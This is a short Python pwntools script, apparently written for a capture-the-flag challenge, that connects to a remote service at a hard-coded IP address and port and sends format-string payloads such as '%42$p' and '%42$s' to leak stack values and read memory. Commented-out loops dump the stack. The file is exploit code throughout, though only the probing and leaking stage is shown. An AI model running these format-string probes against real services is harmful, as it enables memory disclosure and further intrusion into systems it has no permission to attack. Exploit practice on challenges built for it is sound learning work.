#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

p = remote('47.106.94.13',50010)

context.log_level = 'debug'
context.arch = 'amd64'

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

got0 = 0x601020
ru('This\'s my mind!\n')

def addr(pos):
    sl('AAAAAAAA%%%d$p'%(pos))
    return rc()[8:-1]

def cont(pos):
    sl('AAAAAAAA%%%d$s'%(pos))
    return rc()

def target(t):
    payload = p64(t)
    payload += "%7$p"
    sl(payload)
    return rc()


print addr(42)
print cont(42)
#fmt = [7,40,41,42,43,44]
#fmt = [1,2,3]
#stack = []
#for i in fmt:
#    payload = 'AAAAAAAA%'+str(i)+'$p'
#    sl(payload)
#    stack.append(rc()[8:-1])
    # raw_input()

#for i in range(len(stack)):
#    print "%04x"%(i*8), stack[i]

#for i in range(1,4):
#    sl('AA%dAAAAA%%%d$s'%(i,i))
#    rc()
#

